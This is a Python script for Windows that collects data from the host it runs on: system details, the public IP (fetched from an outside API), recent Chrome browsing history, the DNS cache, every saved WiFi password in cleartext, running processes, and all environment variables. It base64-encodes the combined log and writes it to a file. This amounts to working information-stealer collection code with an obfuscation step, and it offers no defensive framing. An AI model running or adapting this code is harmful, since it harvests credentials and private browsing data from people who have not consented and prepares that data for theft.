import subprocess
import re
import base64
import sqlite3
import os
import psutil
from datetime import datetime, timedelta
from requests import get


def get_host_info():
    log = ''
    try:
        command = 'systeminfo'
        key = subprocess.run(command, capture_output=True,
                             text=True, shell=True)
        log += key.stdout+'\n'
        try:
            public_IP = get('https://api.ipify.org').text
            log += "Public IP: "+public_IP+"\n"
        except Exception:
            log += "Failed to read Public IP\n"
    except Exception as e:
        log += f"Failed to fetch host information: {str(e)}\n\n"

    return log


def get_browser_history():
    log = ''
    log += "\nBrowser history: \n"

    try:
        data_path = os.path.expanduser('~') + r"\AppData\Local\Google\Chrome\User Data\Default"
        history_db = os.path.join(data_path, 'history')
        conn = sqlite3.connect(history_db)
        cursor = conn.cursor()

        time_threshold = datetime.now() - timedelta(minutes=30)
        time_threshold_unix = time_threshold.timestamp() * 1000000

        select_statement = f"SELECT urls.url, MAX(visits.visit_time) FROM urls, visits WHERE urls.id = visits.url AND urls.hidden = 0 AND visits.visit_time > {time_threshold_unix} GROUP BY urls.url ORDER BY MAX(visits.visit_time) DESC LIMIT 100;"
        cursor.execute(select_statement)
        results = cursor.fetchall()

        for row in results:
            url = row[0]
            visit_time_unix = row[1] / 1000000
            visit_time = datetime.fromtimestamp(visit_time_unix)
            log += (f"URL: {url}\nLast Visit Time: {visit_time}\n")

        cursor.close()
        conn.close()
    except sqlite3.OperationalError:
        log += "\nChrome is running in the background!\n"
    except Exception as e:
        log += f"\nFailed to extract chrome history: {str(e)}\n"

    return log


def get_dns_cache():
    log = ''
    log += "\n\nDNS cache: \n"

    try:
        command = r'powershell "Get-DnsClientCache | Format-Table -AutoSize"'
        result = subprocess.run(
            command, capture_output=True, text=True, shell=True)
        if result.stdout:
            log += result.stdout + "\n"
        else:
            log += "No DNS cache found\n"
    except Exception as e:
        log += f"Failed to extract DNS info: {str(e)}\n\n"

    return log


def get_wifi_info():
    log = ''
    log += "\nWiFi Information: "
    try:
        command = 'netsh wlan show profiles | find "All User Profile"'
        networks = subprocess.run(
            command, capture_output=True, text=True, shell=True)
        network_names = re.findall(
            pattern="(?:Profile\s*:\s)(.*)", string=networks.stdout)

        for net in network_names:
            try:
                command = 'netsh wlan show profiles name= "' + net + '" key=clear'
                key = subprocess.run(
                    command, capture_output=True, text=True, shell=True)
                out_key = re.search(
                    pattern="(?:Key Content\s*:\s)(.*)", string=key.stdout)
                log += "\nWiFi ID = "+net+" | Password = "+out_key.group(1)
            except Exception:
                log += f'\nError extracting info for [{net}]'

    except Exception as e:
        log += f"\nWiFi Info not available: {str(e)}\n"

    return log


def get_installed_software():
    log = "\n\nInstalled Software: \n"
    try:
        for proc in psutil.process_iter(['pid', 'name']):
            log += f"Process: {proc.info['name']}, PID: {proc.info['pid']}\n"
    except Exception as e:
        log += f"Failed to retrieve installed software: {str(e)}\n"
    return log


def get_running_processes():
    log = "\n\nRunning Processes: \n"
    try:
        for proc in psutil.process_iter(['pid', 'name', 'username']):
            log += f"Process: {proc.info['name']}, PID: {proc.info['pid']}, User: {proc.info['username']}\n"
    except Exception as e:
        log += f"\nFailed to retrieve running processes: {str(e)}\n"
    return log


def get_environment_variables():
    log = "\nEnvironment Variables:\n"
    try:
        for key, value in os.environ.items():
            log += f"{key}: {value}\n"
    except Exception as e:
        log += f'\nFailed to retrieve environment variables: {str(e)}\n'
    return log


def fetch_info(path):
    log = ''

    log += get_host_info()
    log += get_browser_history()
    log += get_dns_cache()
    log += get_wifi_info()
    log += get_installed_software()
    log += get_running_processes()
    log += get_environment_variables()

    encoded_log = base64.b64encode(log.encode()).decode()

    with open(path, 'w') as f:
        f.write(encoded_log)

def test():
    """Testing the code"""

    fetch_info('test.txt')
    with open('test.txt', 'r') as f:
        text = f.read()
    with open('test.txt', 'w') as f:
        f.write(base64.b64decode(text).decode())

if __name__=='__main__':
    test()


